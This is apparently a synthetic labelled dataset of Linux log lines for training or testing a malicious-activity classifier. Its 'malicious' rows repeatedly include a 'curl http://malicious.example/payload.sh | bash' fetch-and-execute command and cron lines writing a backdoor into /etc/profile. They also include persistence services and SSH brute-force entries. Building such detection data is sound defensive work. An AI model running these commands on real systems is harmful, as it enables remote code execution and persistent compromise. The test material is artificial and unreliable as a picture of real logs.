id,log_text,label
9124,bash[7691]: curl http://malicious.example/payload.sh | bash,malicious
9125,kernel: [ 7171.6 ] USB device plugged,normal
9126,kernel: [ 1547.64 ] Module loaded: suspicious_mod,malicious
9127,bash[3304]: curl http://malicious.example/payload.sh | bash,malicious
9128,systemd[1]: Started Session 7534 of user root.,normal
9129,networkd: DHCPv4 address assigned to eth0,normal
9130,CRON[1907]: (root) CMD (whoami),normal
9131,networkd: DHCPv4 address assigned to eth0,normal
9132,systemd[1]: Started Session 4219 of user root.,normal
9133,CRON[6992]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9134,CRON[1483]: (root) CMD (ls),normal
9135,systemd[1]: Created malicious service persistence_1153.service,malicious
9136,CRON[6660]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9137,bash[8814]: curl http://malicious.example/payload.sh | bash,malicious
9138,networkd: DHCPv4 address assigned to eth0,normal
9139,bash[8166]: curl http://malicious.example/payload.sh | bash,malicious
9140,systemd[1]: Created malicious service persistence_5779.service,malicious
9141,CRON[1771]: (root) CMD (uptime),normal
9142,bash[3384]: curl http://malicious.example/payload.sh | bash,malicious
9143,bash[2897]: curl http://malicious.example/payload.sh | bash,malicious
9144,sshd[6428]: Failed password for invalid user admin from 5.188.130.238 port 22 ssh2,malicious
9145,sshd[3329]: Accepted publickey for user from 192.168.138.4 port 22 ssh2,normal
9146,systemd[1]: Created malicious service persistence_7920.service,malicious
9147,bash[2665]: curl http://malicious.example/payload.sh | bash,malicious
9148,kernel: [ 2257.52 ] Module loaded: suspicious_mod,malicious
9149,CRON[8875]: (root) CMD (pwd),normal
9150,sshd[4112]: Failed password for invalid user admin from 5.188.155.220 port 22 ssh2,malicious
9151,kernel: [ 7570.84 ] Module loaded: suspicious_mod,malicious
9152,systemd[1]: Created malicious service persistence_3030.service,malicious
9153,systemd[1]: Started Session 7013 of user root.,normal
9154,networkd: DHCPv4 address assigned to eth0,normal
9155,CRON[2694]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9156,CRON[6867]: (root) CMD (whoami),normal
9157,bash[2976]: curl http://malicious.example/payload.sh | bash,malicious
9158,systemd[1]: Created malicious service persistence_4141.service,malicious
9159,systemd[1]: Created malicious service persistence_5015.service,malicious
9160,systemd[1]: Created malicious service persistence_9087.service,malicious
9161,systemd[1]: Started Session 6318 of user root.,normal
9162,sshd[4932]: Failed password for invalid user admin from 5.188.29.137 port 22 ssh2,malicious
9163,sshd[9895]: Failed password for invalid user admin from 5.188.183.241 port 22 ssh2,malicious
9164,kernel: [ 3548.61 ] USB device plugged,normal
9165,sshd[5495]: Failed password for invalid user admin from 5.188.223.68 port 22 ssh2,malicious
9166,systemd[1]: Started Session 1818 of user root.,normal
9167,CRON[2153]: (root) CMD (pwd),normal
9168,sshd[8270]: Accepted publickey for user from 192.168.189.244 port 22 ssh2,normal
9169,sshd[1473]: Failed password for invalid user admin from 5.188.150.155 port 22 ssh2,malicious
9170,systemd[1]: Created malicious service persistence_2941.service,malicious
9171,networkd: DHCPv4 address assigned to eth0,normal
9172,systemd[1]: Created malicious service persistence_9103.service,malicious
9173,kernel: [ 1445.61 ] Module loaded: suspicious_mod,malicious
9174,systemd[1]: Created malicious service persistence_5097.service,malicious
9175,systemd[1]: Created malicious service persistence_2225.service,malicious
9176,kernel: [ 3603.53 ] USB device plugged,normal
9177,sshd[9888]: Failed password for invalid user admin from 5.188.58.159 port 22 ssh2,malicious
9178,CRON[8501]: (root) CMD (uptime),normal
9179,kernel: [ 1302.56 ] USB device plugged,normal
9180,sshd[5151]: Failed password for invalid user admin from 5.188.241.192 port 22 ssh2,malicious
9181,bash[7633]: curl http://malicious.example/payload.sh | bash,malicious
9182,networkd: DHCPv4 address assigned to eth0,normal
9183,systemd[1]: Created malicious service persistence_8873.service,malicious
9184,networkd: DHCPv4 address assigned to eth0,normal
9185,kernel: [ 3803.83 ] Module loaded: suspicious_mod,malicious
9186,kernel: [ 6475.17 ] Module loaded: suspicious_mod,malicious
9187,sshd[3813]: Accepted publickey for user from 192.168.26.47 port 22 ssh2,normal
9188,sshd[9352]: Failed password for invalid user admin from 5.188.180.91 port 22 ssh2,malicious
9189,sshd[8633]: Accepted publickey for user from 192.168.186.80 port 22 ssh2,normal
9190,systemd[1]: Started Session 8584 of user root.,normal
9191,sshd[2403]: Failed password for invalid user admin from 5.188.77.86 port 22 ssh2,malicious
9192,CRON[1211]: (root) CMD (ls),normal
9193,networkd: DHCPv4 address assigned to eth0,normal
9194,CRON[9088]: (root) CMD (uptime),normal
9195,networkd: DHCPv4 address assigned to eth0,normal
9196,systemd[1]: Started Session 7170 of user root.,normal
9197,kernel: [ 4289.52 ] USB device plugged,normal
9198,CRON[8127]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9199,kernel: [ 6606.76 ] Module loaded: suspicious_mod,malicious
9200,systemd[1]: Started Session 8006 of user root.,normal
9201,kernel: [ 3028.42 ] Module loaded: suspicious_mod,malicious
9202,CRON[7975]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9203,networkd: DHCPv4 address assigned to eth0,normal
9204,bash[5999]: curl http://malicious.example/payload.sh | bash,malicious
9205,CRON[9414]: (root) CMD (ls),normal
9206,CRON[8016]: (root) CMD (whoami),normal
9207,sshd[8028]: Failed password for invalid user admin from 5.188.140.64 port 22 ssh2,malicious
9208,kernel: [ 3461.01 ] USB device plugged,normal
9209,kernel: [ 5403.17 ] Module loaded: suspicious_mod,malicious
9210,systemd[1]: Created malicious service persistence_1853.service,malicious
9211,CRON[2487]: (root) CMD (whoami),normal
9212,CRON[1790]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9213,kernel: [ 7155.0 ] USB device plugged,normal
9214,systemd[1]: Started Session 9478 of user root.,normal
9215,kernel: [ 4689.95 ] Module loaded: suspicious_mod,malicious
9216,systemd[1]: Started Session 4583 of user root.,normal
9217,kernel: [ 5777.38 ] USB device plugged,normal
9218,bash[1935]: curl http://malicious.example/payload.sh | bash,malicious
9219,sshd[3927]: Accepted publickey for user from 192.168.129.135 port 22 ssh2,normal
9220,systemd[1]: Created malicious service persistence_2883.service,malicious
9221,CRON[2339]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9222,kernel: [ 2703.62 ] USB device plugged,normal
9223,CRON[4341]: (root) CMD (pwd),normal
9224,bash[5894]: curl http://malicious.example/payload.sh | bash,malicious
9225,CRON[7094]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9226,sshd[4945]: Failed password for invalid user admin from 5.188.143.12 port 22 ssh2,malicious
9227,CRON[1310]: (root) CMD (uptime),normal
9228,CRON[6879]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9229,kernel: [ 9073.81 ] USB device plugged,normal
9230,sshd[4974]: Accepted publickey for user from 192.168.242.238 port 22 ssh2,normal
9231,CRON[1705]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9232,systemd[1]: Created malicious service persistence_9247.service,malicious
9233,CRON[7746]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9234,sshd[1618]: Failed password for invalid user admin from 5.188.72.86 port 22 ssh2,malicious
9235,sshd[4051]: Accepted publickey for user from 192.168.239.152 port 22 ssh2,normal
9236,systemd[1]: Started Session 7394 of user root.,normal
9237,bash[8328]: curl http://malicious.example/payload.sh | bash,malicious
9238,bash[4802]: curl http://malicious.example/payload.sh | bash,malicious
9239,sshd[4812]: Failed password for invalid user admin from 5.188.81.199 port 22 ssh2,malicious
9240,sshd[2994]: Failed password for invalid user admin from 5.188.168.31 port 22 ssh2,malicious
9241,CRON[5396]: (root) CMD (ls),normal
9242,sshd[9432]: Accepted publickey for user from 192.168.150.98 port 22 ssh2,normal
9243,systemd[1]: Created malicious service persistence_5422.service,malicious
9244,CRON[2693]: (root) CMD (whoami),normal
9245,CRON[9036]: (root) CMD (ls),normal
9246,systemd[1]: Created malicious service persistence_6460.service,malicious
9247,sshd[9939]: Failed password for invalid user admin from 5.188.65.161 port 22 ssh2,malicious
9248,systemd[1]: Started Session 5349 of user root.,normal
9249,sshd[4546]: Accepted publickey for user from 192.168.20.97 port 22 ssh2,normal
9250,kernel: [ 5597.26 ] Module loaded: suspicious_mod,malicious
9251,sshd[4476]: Failed password for invalid user admin from 5.188.0.213 port 22 ssh2,malicious
9252,systemd[1]: Started Session 9047 of user root.,normal
9253,kernel: [ 7900.56 ] Module loaded: suspicious_mod,malicious
9254,sshd[3049]: Accepted publickey for user from 192.168.225.24 port 22 ssh2,normal
9255,networkd: DHCPv4 address assigned to eth0,normal
9256,sshd[9535]: Accepted publickey for user from 192.168.208.236 port 22 ssh2,normal
9257,systemd[1]: Started Session 5062 of user root.,normal
9258,systemd[1]: Started Session 1827 of user root.,normal
9259,kernel: [ 3002.18 ] Module loaded: suspicious_mod,malicious
9260,systemd[1]: Created malicious service persistence_5981.service,malicious
9261,systemd[1]: Created malicious service persistence_1415.service,malicious
9262,kernel: [ 1699.27 ] USB device plugged,normal
9263,bash[7244]: curl http://malicious.example/payload.sh | bash,malicious
9264,systemd[1]: Started Session 1464 of user root.,normal
9265,kernel: [ 6192.06 ] Module loaded: suspicious_mod,malicious
9266,systemd[1]: Created malicious service persistence_9774.service,malicious
9267,bash[6117]: curl http://malicious.example/payload.sh | bash,malicious
9268,networkd: DHCPv4 address assigned to eth0,normal
9269,sshd[3949]: Failed password for invalid user admin from 5.188.217.135 port 22 ssh2,malicious
9270,kernel: [ 4525.53 ] Module loaded: suspicious_mod,malicious
9271,systemd[1]: Started Session 3041 of user root.,normal
9272,kernel: [ 3728.11 ] USB device plugged,normal
9273,CRON[9674]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9274,sshd[5693]: Accepted publickey for user from 192.168.150.249 port 22 ssh2,normal
9275,networkd: DHCPv4 address assigned to eth0,normal
9276,bash[5173]: curl http://malicious.example/payload.sh | bash,malicious
9277,sshd[7023]: Accepted publickey for user from 192.168.152.9 port 22 ssh2,normal
9278,CRON[1593]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9279,networkd: DHCPv4 address assigned to eth0,normal
9280,sshd[4894]: Accepted publickey for user from 192.168.176.181 port 22 ssh2,normal
9281,sshd[5898]: Failed password for invalid user admin from 5.188.70.196 port 22 ssh2,malicious
9282,networkd: DHCPv4 address assigned to eth0,normal
9283,CRON[8485]: (root) CMD (ls),normal
9284,kernel: [ 7052.14 ] USB device plugged,normal
9285,systemd[1]: Started Session 8020 of user root.,normal
9286,networkd: DHCPv4 address assigned to eth0,normal
9287,networkd: DHCPv4 address assigned to eth0,normal
9288,CRON[1730]: (root) CMD (ls),normal
9289,kernel: [ 1811.08 ] USB device plugged,normal
9290,kernel: [ 9253.79 ] USB device plugged,normal
9291,networkd: DHCPv4 address assigned to eth0,normal
9292,CRON[7446]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9293,kernel: [ 9764.02 ] USB device plugged,normal
9294,systemd[1]: Started Session 3906 of user root.,normal
9295,kernel: [ 4316.94 ] USB device plugged,normal
9296,CRON[2526]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9297,systemd[1]: Created malicious service persistence_1214.service,malicious
9298,networkd: DHCPv4 address assigned to eth0,normal
9299,sshd[7007]: Failed password for invalid user admin from 5.188.161.30 port 22 ssh2,malicious
9300,kernel: [ 8890.75 ] Module loaded: suspicious_mod,malicious
9301,sshd[5847]: Failed password for invalid user admin from 5.188.33.44 port 22 ssh2,malicious
9302,bash[2904]: curl http://malicious.example/payload.sh | bash,malicious
9303,networkd: DHCPv4 address assigned to eth0,normal
9304,bash[1534]: curl http://malicious.example/payload.sh | bash,malicious
9305,bash[8996]: curl http://malicious.example/payload.sh | bash,malicious
9306,networkd: DHCPv4 address assigned to eth0,normal
9307,systemd[1]: Created malicious service persistence_7437.service,malicious
9308,kernel: [ 1417.56 ] USB device plugged,normal
9309,bash[3634]: curl http://malicious.example/payload.sh | bash,malicious
9310,networkd: DHCPv4 address assigned to eth0,normal
9311,bash[2592]: curl http://malicious.example/payload.sh | bash,malicious
9312,bash[8243]: curl http://malicious.example/payload.sh | bash,malicious
9313,networkd: DHCPv4 address assigned to eth0,normal
9314,kernel: [ 2005.33 ] USB device plugged,normal
9315,kernel: [ 6522.23 ] USB device plugged,normal
9316,systemd[1]: Created malicious service persistence_4183.service,malicious
9317,systemd[1]: Created malicious service persistence_4707.service,malicious
9318,sshd[4457]: Accepted publickey for user from 192.168.149.135 port 22 ssh2,normal
9319,sshd[2026]: Failed password for invalid user admin from 5.188.59.183 port 22 ssh2,malicious
9320,bash[3275]: curl http://malicious.example/payload.sh | bash,malicious
9321,kernel: [ 413.29 ] USB device plugged,normal
9322,kernel: [ 2524.65 ] Module loaded: suspicious_mod,malicious
9323,networkd: DHCPv4 address assigned to eth0,normal
9324,systemd[1]: Created malicious service persistence_5329.service,malicious
9325,CRON[1947]: (root) CMD (uptime),normal
9326,bash[7656]: curl http://malicious.example/payload.sh | bash,malicious
9327,sshd[6252]: Accepted publickey for user from 192.168.93.62 port 22 ssh2,normal
9328,kernel: [ 8812.34 ] Module loaded: suspicious_mod,malicious
9329,kernel: [ 6209.53 ] USB device plugged,normal
9330,kernel: [ 4175.12 ] Module loaded: suspicious_mod,malicious
9331,CRON[6457]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9332,kernel: [ 1753.51 ] Module loaded: suspicious_mod,malicious
9333,CRON[7986]: (root) CMD (uptime),normal
9334,bash[1881]: curl http://malicious.example/payload.sh | bash,malicious
9335,sshd[7049]: Failed password for invalid user admin from 5.188.207.81 port 22 ssh2,malicious
9336,kernel: [ 5217.91 ] USB device plugged,normal
9337,systemd[1]: Started Session 7877 of user root.,normal
9338,bash[3932]: curl http://malicious.example/payload.sh | bash,malicious
9339,systemd[1]: Started Session 6797 of user root.,normal
9340,kernel: [ 8488.66 ] USB device plugged,normal
9341,CRON[1420]: (root) CMD (pwd),normal
9342,bash[6864]: curl http://malicious.example/payload.sh | bash,malicious
9343,CRON[4988]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9344,networkd: DHCPv4 address assigned to eth0,normal
9345,bash[7527]: curl http://malicious.example/payload.sh | bash,malicious
9346,systemd[1]: Started Session 8058 of user root.,normal
9347,bash[3202]: curl http://malicious.example/payload.sh | bash,malicious
9348,CRON[5963]: (root) CMD (whoami),normal
9349,CRON[3982]: (root) CMD (whoami),normal
9350,systemd[1]: Created malicious service persistence_7561.service,malicious
9351,sshd[2916]: Accepted publickey for user from 192.168.241.168 port 22 ssh2,normal
9352,networkd: DHCPv4 address assigned to eth0,normal
9353,systemd[1]: Created malicious service persistence_2538.service,malicious
9354,systemd[1]: Created malicious service persistence_4861.service,malicious
9355,systemd[1]: Started Session 3095 of user root.,normal
9356,bash[9570]: curl http://malicious.example/payload.sh | bash,malicious
9357,kernel: [ 1603.16 ] Module loaded: suspicious_mod,malicious
9358,kernel: [ 2867.47 ] Module loaded: suspicious_mod,malicious
9359,sshd[8871]: Accepted publickey for user from 192.168.250.224 port 22 ssh2,normal
9360,CRON[1326]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9361,systemd[1]: Started Session 4280 of user root.,normal
9362,kernel: [ 3748.36 ] USB device plugged,normal
